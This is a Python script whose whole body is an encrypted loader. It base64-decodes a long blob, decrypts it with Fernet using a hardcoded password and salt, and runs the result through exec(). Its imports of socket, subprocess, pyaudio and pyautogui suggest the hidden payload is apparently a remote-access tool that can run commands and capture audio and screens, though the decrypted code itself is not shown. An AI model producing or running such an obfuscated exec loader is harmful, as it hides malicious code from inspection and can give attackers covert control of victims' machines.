from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
from cryptography.fernet import Fernet
import os
import socket
import subprocess
import time
import signal
import sys
import struct
import pyaudio
import pyautogui

data = b'Z0FBQUFBQmQzT2hGRnBRblc5THZ1T2lnNDktVWZxT3dfQnJvS3JFZ3NjTVdSQTVyQ1VhU2JGbGxCX1JZV0Yya0NZZTdNdFJRSHFzdVBpc09fdFB3WmpxVmRiZUtmRFdwV0plSWRxcS1JMEdWeDExTy1WS1RoeTJCZ3BkdF9oeG5YNHhOU3FXU1RJMVg4VzA2ems5QjhhV1JseWp2V3pFelJ6bFJJN0dzMGx1WjYxWFdnV3M2eC1ObllyS0VGazhORFI0Nlk2QUgwbjlSMHVBWmdxMUZKdXljQWZxbDBPeWZUUmxlWldaOUtnMkZHWkFTRHdiOGRyZWwySjA2aGpIUUZqN05WMVlyYkNMX0taZEJ1SVFZVU16ZWxnOW9zSFcwS1VQMEJvajNQR3RITXZULU5rcG9uYTBEMGNIazNzX3E0NVJObVJyRkhycTBSNjdmbXdJZF92NzlTcnBzdE9sRjJid2kyQ2Rhak1YaEpOVy1vWktJLVFxMWt1dGh4bERiWkhIMFllOElyODJhTWRRRDhVR2tya0ZoT0xmcWRFRW9wSzd0YUU3VW9HcFloRUpkWnlySXljMXRndjlTd29VeDY4d3BidWdUUm1OZno2TWxQLV81WmZDcjd5TUxIY2NGUlRlRVpjRjJ4b2ozWWdoeUh0WTE0WFB4TlFJLTZmNkZzUUxEN1hhTEJDLVFVWWs3RW83V01vU3lpU1dDbVdadVBXR2FQaTA3cHcxX20yVE01dGloOXA1eWlIWlh1VjBuYXF4bm5xMlBtMDh2VFd4SWtMYXFWbVZDTU82YUlOV1pic3ZwLWpnV0s2S0tvOUFhMWw4QlJQTE5NbXlDU0VwMkxzSkZVdUZ0MEl0RzA4ZFRrTlZnLU0wLW5ySFZUdUJYTnpHV1hoUHRkaVJBWDZQSW90MVF1Rms2X05uME5GanRsOVloNHlGWHIwRnVRaHBuQWpTOWdGdDJzQ0stOW5uS3AyN2ZHUUtBY1pQMHRXWU4xR1RhQjJkMTQ4N0NtQTVaTGU3akVEZmZtOWIwWXFQa1ZoQV82WDhDdm5JU292Y190OUU5RWJjNGM4WlNLb2tIc2dBNUd2d1FVMDkwZGxwcjdaVUoxaXZfWWNubDFmajAxckxEenNDcENpcEhKM0h1MDlEazJ5VTZRSzVmSzlIcl9sNnBlMGtfSGxaS2FMVmd5NUM2NERpWFR6b0VGWmNtZ0FxQURZa20zMFlobXRKNlREWXVFN2FHQXdodTVfNWJfOERfY3BfR0lPTlJTcjJ6bVN1eGdNY0JNcjVMYlk0N3gzMlBJa2t0TGNiem13ZzdqUGV6bGxHZW4yN2FqWjU4akZ5dFNXakt4TzlLWU1CYi01d1YxVHBTakc4MXdkZjJjbWNVT20xbXR0WEdrUVZiREFRQXdmbVZELWJ5SnhRM1FOclJFeXZkZFUyX1hCTjJCUGJzRG5qeTlXdDFQVTE5MGNaUi1uWXRtbWhyNXk1dEQyRkNZdkNHaG5nazNPdEJvcWNKa0ZIZGtBM0lfN2lQLUlXY3pLUVBfS1dhRGpNTHVLZ1lQVTZtSWFfQWRaYm9IVnlhWGNhRElRMWhHdDVhV3Z2MXY4b2V0QjhHbXMwNHljOVpMZDNWUS13ZW9Ub3UzMVBSN1hEUHZoUnFnb2gtS0RtcUEwN0FmVVRvLXM3QWdQTC1LcHNKaGVRamttM004X3RGSjF5RDRSNVB0akw3YUxHcW9tWnFJanozZzNwWVZQLWRtMDVGMGNPZWlSdExmVktkNUVyTGpOeVJveFE2RklqTTVTUmluWEJ2ellGdlFNNmVRNW5XOTBtd3I2cHkteG1TWC1qNGVQS2N2d2htLVIzajhEMWFzZVlwempNRzJVYklOaDdmVkV3Mk1fUTJ6OTk4SjhEcllvc1VXU24tN2N4YmlIOEJ1endMbjZEa3hfLXdTX1JKT29ONnBCR1cycXhjeVJzbEJEU3pVWERKMi05czY1cnJuX0VNWmxhUVVRMzBmd2xWMC1hbWxzdml2QjZWME5CQUltbE0wOXJ4cHdGZDhYUnNqZ0xzQmxqV0xBdzh2WkY5d2tIc3Y4SUlSUzBwM3hQSHoydWJTTms0ODZqczNIOUpna2tFSHduWDRYbTJoU3RCdlJBTVlTcE12aEhMRGlSWVJqbGEzSi1WcHpwQnpQSjdpM3VMTVF4RFlFYmZycks4MzQ5emhDMHBDZUVzRTBweERPZ3kxRmZucHdqWndFOXpGNXFmblFraVlrNVVlRG5tSmtkc3JxN0QzbUgtZ3p3QTl3czUwS3V1NXBrZXRhX3VwTFJha2c2WUtYbVlaSHhWVFFyeEZPUnphYXNTcGVFZ2FtcERSYlJnQVU2WFowQmU0Rms2aUtMSVo1Q0VkeWgtdVhrQ0FhTE5CZ1BzWEVCem5XTF81akh6Zk1fRmQtZTZDU29tNzdpUDJ1SlJ0WXl1X2FkN3E3cUVHSUpLTXdBX01IaGl5Y2h5Q2pQdEFvUnlaekl3a3JOZ24xdzhxbFNVbV9oaGg5SnZpRU5vczZfcVdjR3ZTNnd0SXZXaGZhMDZKaW5lWHVJY2s2alkxc2dkcnRtQ2UzczR5RlcySGVhNTA4dVJJb05mZUlwN1RPOTF0aWZ1bmFFS0w2aklzYThPeXBTRUFNOTZZLVM4cjVKTGRHaWlMZ29RLVJfSUgtX01zNUMyUHY4ak5DY1pLRXpNNHJGVDRaMG9CWHJLM1F6VXBBVGJZZzYzcWUySFhuNHJoQUVzZUl0RVFPU1pYaGVpMDhlZXRHSjFBamRoVjlVdmYzWTlQS0xNc09lUnRtWFBIUFRtaXBYN0J4TlZpaEpXT1FrRW9TUEtlcTAyaW84SHdSLUtoS0prQkFVUEsxbk1pR0M1OFJoR1h5cnJTcmFIdGxTY1pleF84d1RJaGQxdE9mVDIwWm1yRE5Ld0VlSER4QkJoVkh4OG1tTThPRG5LTnlJRkVZQ1FZdEdwbTJZTHpEdEFsYkNISTQyTWp1aXVlS0d6ZmdHX1pqa0RLaXpRZ3pqUGgwM0h1bzEwRWtPN3hZY01QSUlPLVdDcmxHeXVGREx5ZWtsQldkT2MzSjVuaklfSFZHdlc0WURvSjBrTWczel8tVjNDWS1Mb2M3VHZNbjNYbnVDa1loN1pvWU9WUDFQUXZ0SmFSQXBXWUZqZnZReEloazdCcG9mV0JneEw0NXhzLWN0aXVJS2haNmV1TTdqOElHc0FTZDh6cFZVWUI0N1RaMENubkY0ZEpLM3NrS3Npa0VSaXJacmRzMWp3MDFDUGlJaHo0MGI0cVExa0NKMVZNQnRMUnNhU1o5SzhJSDRHZHlfU3YwVW1lVXFtUUd1NUZTT0pQTGtRaktKeV92cDVGNjVOOGVhakZlNjBtVG14LXJGakZhZi1TNmlWODZQb2xJNlRQMkpQOUpJckJyMk9IS25haUIzczRfbXNTb2NIbVEzekdNQVU0aEpUQ2Y0R0F4TzlxREhyVENCZ2RvZENwOW1kcUZOR3Vrb0I5ZnU4VXl6WnJTTlRYWFdxTFMyT3lLWkM4UUwta2dsTEplT0dfVDNnZFpxekdJVUtrNXo1NmRsNHo4VXJqazJaeTFXZXVZSlhyd3BfQmRXeU9SSjVXQXJqX0Y5YTF0MnBTdkYzTXFQZDRyVnJQeEJfMzk5aEtnM3hIMUhNUWpxUXRrMXloWjBEaFVtM1o2NzdHSHZhSWhPNHBSTHFKQThIUDZpVHlzdnFqWGNBZnhKc1pfZVFOV3BOODYxTVBMakw4cVpxNkZfSDNhbXRKSUVLaUVscElORDViZHJyZy12TDk5OTNwWVhLSk93cjJQUmZ3bnVyQUhlM0FWbHNGMFg1dkt2R2Q4U3FyVTVnenBIUUFGVkJ5cjRSOGtlZ1o3bGtxRzhSYUhDWjNpeW8tc2FIOVZvMFFoQmRfaFBBS0F3TzlEYUtUWEt2ZEw1WFgzMjFFUzFNcVFOVkpJX25hbVZZOU91UjFjSUUyRTh4amNLenpvVlNvMkhGaWlEZlZ1LTRVY0tKR3Q5enJhYWlERV9OeUg1bXluWlhoRDBrMDZEa0NNOXRrZWFscWtyVllqVDJmNXI0UllVWmdRQ2FtdEFnY0ZHM2NiQTZIdVNlSC1JUUs2SHhTcDAyQy1WOE5MY2EzbXAwTFpLOWRWUTZsQjhCYmNqcE1SYnZGaWRLQ3JKM3MwS215WmFvVUQtUTRCT3FxbWdwbFF5M0R4eFk4X3FUanJ6UTVuOTFFZXhieHhXUWRaNGwxWlZjS2dlYzhvcnBOa0o4SFZSRF93ZnpZVXNRZHVaQ29uUVpHZnhUTGNXTklYZUM0MklkSG9VcU55UW9pVWVUeldycHU2WEhGUnZUTXBMSlN1TzJwVVA2TDhYT3M2R1BsY3BLNDY1UVU3bUtreDVhQ2dBSGhZbDh1eHdEUkcwbFRMTVV3RkF6emM4U0NpZmRVcWpnVUlUbDVpNUF6YUJ2S0dCWUdzSDFzc1JBdXprd2JjNV9XNWNsZHlTam91QmZOblZPV0pCWlhPaFBNZGNaX0x2UkF0MHVDbmNRVHBWY2hQREs3dzhxcnN1OVA0dnNVWUNkR3BpSnczZ1RGeENiSGRtVDY2TE8xZlI1UTFTN3pzUnB3V1I3WHYzWWoySmdVcjV0VW5kVS1hSWZtNUFQbmlMUUg5TFRDaUtoQkFRU0dvR0hWaXBtNVVGM3piUWFrWlVVQ1ZiMTQ2Zzg3M3dBMzRHZElrVnBEcVlXdHpfMmJVV1RpSFdEaVNiVl92Y2ppaU1PUE9na000ZDRBUW9yRXh4WUp1QXpnVXEwd2dRUTV3Z29VVHpLb09ybkdPLUFkc3pJUW83MHdGN0pOd1psZXRGLW1ldHdURkdxYXlTOFV2ZHd5a0xjTFlGbzRjZUc1NXo3V2lSNjdHLXBoRDZBbjV2WEFjaktqaXR2bXQzb184QURuUmVoZEJEamZrSVVVcF9CZTIxbDVuX0xWZ0cxUHlidWJ3dW5yNHkyMzQzRXh1S3BjN2ZFQVVGQUd5aGljYUNpZ200TkhoLTNJMkN6RlFNb3Q1aGh6dmd4S3hBRU5jcjh5TE9xcDVsaUxINm9xY3duZUtSejRfbVFJT0JFR1BsRUFVd3lzQlE2UnM4eEZOU3NXMEU1N2NCMVhDRlhldll1UnJhMDBWbFNuS01ia1MzT0E0UlBmYUVwdmZqTmNpTHY3R3Bfdm5oZDlONFExVFlYQzJfaUF3ODR6cUZjd1NtcHpnaGxsaU9wWVRuNTRvcXk4RS0tNG41aS0wLV9kUVVIb2QwUUFNbzBEY1VKS3Y2NnY1NlVxMnN4T2ZvcHlfVVNJWXo4VW5Jbnd6VktCdWJsTXIzUkNVT3ItdGFBR2FTbkJIOGZZblVEbzc1ZEZWOE5KWVFXZEZabkZmTTNQVGh2dG11SDZfdS1YeHhnQUpEWEV6TjN0MFVpS0FHeWtETWRSTTBGNkJydFlGTmNvU1dpOGVWLWlhMnVBbGZMMGVqZ2dyTTgtV2pOZHhxMFZIM0c1SkhvTjVucFZIYURqRHBVYXRkYTQzOHJHdWhvMjBpV2RyT3l1bHhrdVFsanlka0hEamp3SndYeDd3Rlk5YTJaNktxX3JYa3BsSzBMRkhidEYzRndoM2hhcTlWWlRVRzM0SUNIY2ItUUhkcUtzMjdHMWptRWNaLXBVUUY2VW90UXdmLVd0aGQtRk1pZ05PU1AwTE5OVmI2WGtwa1B2SVAwc1h3ZTc4QW9pNXAzOFJ0MEo2ZlNQU0h2Y1JqLVhqS21uLWw0UnhfSm0yRzhNSWV4djBMNW9Mc3lCREVqYmtpWVJPMVVaSGlKdnNmc2R6VWJTXzdKU2pUajZqODAwRDM5SWYwWDFKZTc2dHZ3VmRLMEdqb1VvZkt5ZkJZUENwMzlZSElrcXptSmJqbWw3WnEwb05mcGp1RlE2UVBoYmpRVE1ZT3Z3dTFSUVpOYjJFU3A4VTg5ODQwM2U2eWQ3bURybV9WV1A3cnFWbGRJMGtBa083TG9YQUpyN05fOVRfeFExYW5FalRvaFlzcXRhaGk3Mmszb1RUNENzYnNJd2tSR3VGbmhUOFRjSzJGOG1acmdhYUxCaDcyeVo2SjlPZ29JYndZZnhYZkRMNkpDMjJ5OTlvbmdUX2NTcExjdGhGWDdJRS15bGh4T0VIN2hvR29lS3NRdEJWenRyNEdHM2xDUDJpUDZsWFVVOVBUT2tKOXdkODFLckF1WlF4N1BFWnMxYk5CRnhJeUFoQ3ltTHRhMHp2R19idmRScXlmZHRRaHpQbUhlS0VnMEVpVGMxZFpwak9GUFI4bTBzQWZvSk5TdmRjMERaWkEyNGJ2SGh4WEZ6aktCMERvNEZuZW1VaERTcGg2a0d3SGJhR1lJZTU1MHlpS2hPa2RYNjZZNUxBLXdvemJFeTlTcThEVTJNNGNabkZSSXVxb0M3dFljeVpobURUSnowQkxiMkp0bmU5eDdabUItWjlldUc5WDEtYS15LUNBUlBqam5qN3dFQ25HV2xKMERLWlRyWTVqSEFONGZaWEczSEpUZE1XOFR3bWRpbmJwOVdnX0llZVhXMzJzaV9udUMxZHRRX2V2aVFrd3dhWUJhVnBEYmJuX0gtX0FZM19WNGJfakVwaVc3X242MzRkV0MzOWtGbnpkc1ZaYi1QQ2NTRXFVS1Rtak5SZ2NlM0RfRTZ0clAwTDFGdHYyYk5rQWthNkhMc0RqOGpmbVFfVHh6SDNMcW83RmF4dV8xMGxXSWFNLTVVdVN2LWtEdVVqTWxJa2lzbjNNV3FlWTJWRGZVYk9BZXhLS2Noc0c3N1JjOWR1MlVZWUpNOHMweUpoTkxZXzNPend1cnNHQ1ZkbkczZ1RqYkQyVDlPbEZya21xSWREaE9qc3VpS3FHVmtNVmZLX2dyOHBwLUhiMElwbFV6THphYzhCclEtd2swNFNIM3JBTWQ5Z1RKdHNtTGpZdlZCbTVZbUVlTzRGeC1UTnNJazN0SHQ0ZUxMUGNTSmVkS0w5dXYySTlLNWprcUJqVUZFZ0hOM3RuM2EwbnljczBhZmhTVktaZ3NuYjBzY2QzaERmQ1JWU04zRkFMZlNybE5tYnBGZXFmUURSOHp0SkdmNTdOLWJsSjJqdkZJeXQ1aTI1dHNVY096ZXViTVQzQUpteGxJVUszalY2dmd0TFVsOUhPa3hVNlVxTHFibU9vOE9xOUhJdm55ZlBGVV94c0RpMEtQeFo3a0k4S2FZSG56dUZKT0VQY2pBcXJXTTM2ZC1uZHpTWC1DNTVmdnptRnZodTgwUkhfNTV5RTNiSjk3QWtyVFBiSVlrN012dm1WRzVfdnVGZldQakZuVHFmWl9jeEhMZ0lVMUQ3X2UyUEdaeGJXSmFOUndHYWxocUJrMlF4NnVwVUJNdDNSOGlxTjNrNE9ZYnBYM2xYQkoyVl9DRmlmUGp5eG9oQXhITlpnZk1LU1dHa01mSnpPSDBiS1VfWmNOeXphenM5U1QtNENhemNtMm1sVTlvR3JZcEt4WmFUdFQzTjVzdVl5S0VSQTc3U3lkTWNEUUhZOFpiSFlSa2w5eTBDMWZpVFExa1IzYXB3TndYTGJScUlycndCbkEtR3E3R1FUN2NldmlQdjg0WXNJMHdPMmQ4QXRsVHFqZ21uVU92OHRHbzNOMWFaQ0VHeG1PenNfWmVHOXdkal85T25OSmFVb3FacFg4WDRDRWs5VUI2a2EtZEdYb0NzRzNOTDRtUTRRRkRRakk2XzVRbzZsWDJGLWNqdWZjZFNRc1RaWXVENHdNNW9tRFFtSEU3dlFqRXpfZHhWYTczbWE1TTdTOTZqbGRya2JUQlZpXzhTNmlFTlpzaXNOd014ak9SMzRmMzJxRjlhVkNpZDZwN2JuNXhoekRBV1lVVnpnV1ZmaXlMdHRralJtLVplbXZONWw3aGw3NnV5UGExSTNGTGl5WXdmNEdfZ2QtXzU5RlhEdy1tenpVa3gzeEZ3UmJ2TWVFeG5iaDRfQ1k0TzFOcTUzWlVGMW5WX0VWcTgxYnJWZ2R5QzJsNUlVS09TVlRDOWhRaG02ZXU0bXZNcXBMdndEc1ozY2tjUV93Nk9jLUc2T1VVM05GRHU4X0V0bGJ2ZUJ2cWpHSmdVNFNzSkVVY0J3MjBJbk1VbFF2aHdGODBWNmpkRF9DTTZYMnlVUWJaZ3h1bXhBbzluTllScTl6OTR1SFB6UktXYmMwNUgxTHRCVWVseHlCMDJxVHlNTC1acUtRdzhDdkJ6S21ZWEFmSWhsdEhDYnVYY0d2UklLSlZSRFlGOFlkem9iaFFibTZCYmpFUFlxTFZWVVZWYzRNZWRPb0oyeXdCa1dsSE9HaEV2bkRGRDlCbEF4Slpfc0JIZUtSTHdfOU1oa29RVng5aFpCN3BqYU9nRFZaNTFKdDZfRnVPVkJUbHlSd09CYUp3UjVsOUhralhKUXhoVVRDNlFaWldhbEQwTHMzUlRBRmFhM3dLVmRtc3ZxUVRUY0pwaC1FbjEwTFVlWDA0NlhMTGdTTUpRSkExU2pZXzBkSXZXeEpralhSRUZ6bTU1U0xOTlNrOEcxcVJvOHRuNTQ1UkFUamZmVk9zdGRoZzRJS3NOdDJmVzBGand6V2dNTW5jUF9vZEhhSGo0NjVqa0JCRmZYS3gyR0gzc0hRN1JENE9hRE8tS2RmQm4zRkk2SGtsQVdFYWE2X3lza0E5emdnS2lrUE1Xbk1wMUllVFZTVE1xNGVXd3h5VmFnUHRDc1c3Y3VESzBuVHFPT1lWZXZHNnpLZjNKVmhPRUpMOXBsQkZjaC16SktvclNOMHVFSGZTWndyR1JOZnJ6S0Fnc1ppNVRJSXlpWVRQT3lKTW95U3JtUlJXQ0N0ay1yeGd0ZU10cU5mdTRvcWRiQlZRNDZTOVNabnNBT3k0MklUT3lOZzVtS3FJOUoyUEtjNHBBM3cwMmhTNEN4dGExV2hNbjk2UjBLOHUyVWZaZHNJamRIZ1I5UzJZVmxpQ00xYzd5VVFUbzlvajlnRGhNWjMtVDlWc3NONkJkT3A1Wmx1eTloVHI4X2QzQ2tBdG1BT1REcU1kVXdxcTZuTEdoVnEtbE5RVm1WNElJVW5OS3RFaTN3Z2ZjdW5pa01oZ05JM3kyWS1LaWNaVVVnZ0dFTE80U1JXNWozZkFJUUZGdEdIeGJUcTJJMVhFT05aYW9yS2Q2N013Rl9pWGhaMlFEMW1LMi1QRkNxVk1ONkVCYm1PeFphZ3VLMm9NcjkyNEYtR3FXTlRQNWp2eHBVWDN5NERuSFBjV2Zzd2JCNDVjUl9LRVM5TjNGTUx4NG1sbWV0cjlZSUQzNDJQMXA0cGo3bDRTYzM2TnFlaDN4ZFRQVGIwOE5JZlRBM2F6OGNQSnRSTldYUl9oSU9INDBMUFFiX3lsYzJEdm40anMwZk5uVkJfZTkzcEY1ZXBRaEhIZ285bnNnNmFaY0k0aTdrQ3FXU3VpeGg1akk5YV9mMmdRcEpSY3hfZ2pzdThKZndYNktjcXRlLUd1eVkwZ2tYOEl6Y09ZT2hMMS02c1M3UFc4VkhQNWlscm1IcDJDc29jdkNKdGw5Wi1SN05INnoyQWIxU1A1ZUZ3MGRWcDQ0dUd3QzcxYTRlTlBFcDd2YTIzaERxUUhuckkwSWRMenB0N3FicDNJNVhQMWZlOEsyM2NZUVFtQ0lqUXl0dWFZUF9GMGJYaEdUN2JNSHcxUkE1azdtQkZ2dkg0Vmp1RkJvX1kxRjQtVXpnVG5RMUFxZUl2eVV2ODJnNGIxYzYwWVp2U1EzXzNOZ0VVTTN2OWZyRXl1Y2w3ck1ya1I1SndEV3U1Z0pSLTBTTzBuWDVnTVB0ZmtxWGxrR0xlb0ZnVmZNblZtR01kbDZCX0JwU1ctVFVRMWdzcHpHcGtGT3FRclFkWWFUNWp3aUlzVlpPb2t6eExYMGJCZ0dVZVRPTmZkQnFYSW9KaHZ4LU1HU3ZtbjZlR1BNaUxmR3V6T0Z6blVhbkZVeVJoTnlIRWZmRF9LQ2NiLXh4bTExZWZtYnNxRVI0V2lSU01HZkpCRnIzM0RJVjRnd2lHOWZFNnhnenVaRXpMWGdXSXh0Mkk1NEwxT3M5WkxNdFJoeDZPNTR0eklfWVRrWE96WFJHc3MyUlgyNlZUQldGem1tZEZMUkdJTFFvZkRIeHJldUVtZWtTN3AxbDZtM0pZQmUtWldrUEVUSE9idlUyWnVMd2RrZ0I1SlYxczFMRzhzUjlmWFRFWFF6QWc1M2RxUjlWMzlYUDNNRnExRWNoUkI1d1ZublVFNzFqUndEb2VMWUVPcFNyWnBXZ3RQSkVXdkc5NVFMY2E2VzNPMTZDVjZNbmZMRlhtYUNkZk1IbDE4YjFIVk1hYmpfY3g1R19NZlFzSjBwUy1ZZURZQUdhWDJBUWF3MDRQaW1JNlpsM2NiZTdDaktuRTNQb0NiRUFFUGwxaXdJdFV6dnZSc2ZyOVRKWXhNdmprVThxV3ZNbzFybjRrTXk2Nm9JSkd6SGRFa2Y1emVjREdDbDhhTncwX1NhN0VKSms1TndaT3NiWm9ZcF9TVVVPdkU4aThnMm1YUExNUUp4ZjdPM21vMkhQYm43Y2JlQTQ0ZDBsNWZxZWR4cE1nVUtJUGxOV0JkaE1VNW5aYzhXWTlZa2Q3VUMtNVVYdUZ1d3oyeDNreUFEQWhxcEhJQTFDcVhmUVZsZUtTWjdxUDg1VXFGTVoxQUUtbk1fV3JZSzRETFAtczZNb3dGQnBCTWNzZm1OMFB5MTNHUjdyUi1SZVdSVUFHNW9saVJ2QXJFdk1uckJDU1JVQlhsbnJXN1VISHBFSGNfV3NJWXV2ZkppNm9rUk5wVEZqZ3U0WVhqemJpUDJVcFp6TmxHY2lQbTMtVXNqNUg4ZFRwV1RnQm8xZmtWSnFzYktLTWhVYkk4bHd5dTliYUZZRHJxd3AybHI2Z09vRndLYklvenh1UmNRU1F0cWhXMU43YnQ2TWxKSGVrMm9LOUJvZDNiUXhzWmcyVkVJTHpOajdQQlJXYTB5bWJIRUZJN2JLZkZYWXZ2UWYyQmNKakxDZDJQalVnSUFxZm84YWlIR0cyaTlzM2NZRVNRczlJUS1JekxFZEhRenhhRVRBWTJyNnZXMXNQdGpCTlR3WHBvN1ZrWS11Sk80a3RGUmRsVDYyYlJQQWpKTnJIWEdwMUFaV3B0UFFPbTVSUGFvSnFUNW1pR1dGUkJtT3VDSHVxX0NLNUZMUXdSNWxYOUlyYU9KSzZJdW1CeFlPUnVfQ2piNVBUdjdmWEVCZzM5X01weE9hVzQ3TV9wWW84RU5pSnBtQjBrZVJxY2RwaHM0N0JXOWl5eXUtS3pRUE0yWTRuQ29rYVlOajVnY3VrX1dybFdoNVJsbURabF9lNEFkUTZZUWlWNlJMRU1zTWJETHdXaTZfWW1Da0FRT3FwcmIyd0xXU2tJV3V0Rl9KQlZDa0c3b2JRME1aOHBRLXQ1T1d3TW1jeTVRaS1tOTVzRUo2OFZBbXU5QmNlY0tOekZqOTZtMlAyVVZDNzJzX2J3QWNmS2ZXSV83SlUxSDktUFo2RzVyU0NhcjZadGpya3A5bms0VmlXM0k2RWY2SE5NQ2VDcW5veXBxZ0VSS0hZVi1DVnYzNWxnblV0N2FQbUxPVllUUkZoUWhFS0Rsa0h5VEYzTko4LVR3emJvXzBVS0wwX21RSVdvOHlKTWcxUVQ3U0JMSmF0eXNpbHpKbGxmYllfbnk2RXB3djlrelNpcnlZbGlDX3dVcHROeUlZV3l3cW9UclN3d21RVEtsMVNlaFVsOUFVbjliemRzRlZ1TnFYN0hwWC1ZcS13TUJ5QkNfelp0VUhVTWwwY2x5ZjFtVmsybjNvM3NtVU5RWTZUV1BuMVpIdFhsWVQ3em0tUXpHeW9pY3F6UHA1WXZ2YTlSUzQxN29peEg2NFJfaUhFVktNNVA2d1d3OFdDX2JxdHpDVFJiYVF5ZzRmQXVXdlpycktUR1JwVDFfWkdpRGVQZmxfZkVNNkQzalZKT2ZZNDR0TGJab1RGbVFtV2lIZGJKY2NQNU9DUG9HZ3hpM3dTZHllSzl2MDlyX2dLbTlzcHVIZnNjMnBLLS10Y3NYMDhYNF9HWmpkZTI5MVlzbmFhbFY2VnRFUGtIM0lFSEVkZEtQTmlOTWphR3VsUDlEc1loeS1NeFk2czdDQWJkOW14dWVNTzBVY291cTdid3B4ekVkcGFqTnRhcnlYRWM0M24xRW1oZmZfU2lLcnNOWnYySk5SSjRqRUc2WXZzSkxNQ0JHRTItUzFWWENmclB5RFVQZTVzeGFyZnlBRGw2TVZ4N1hQVWNTclcwNkJpT0c2N0FNMnN1dUctRlRFZ2JlZ3hmMVZ3dGNnc2V3OE9NT0oxaFMtSnZreVZfaGswa0oxd0hvOWExZVVQeU11bUJ0Smh4STRFMzVkdTR3PT0='
unbase64 = base64.b64decode(data)
password_provided = "V3ryS3cur3P4ssw0rd" # This is input in the form of a string
password = password_provided.encode() # Convert to type bytes
salt = "SocketProgrammingisCool".encode() # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))
fernet = Fernet(key)
encrypted = fernet.decrypt(unbase64)
real_shit = encrypted.decode()
#print(real_shit)
exec(real_shit)


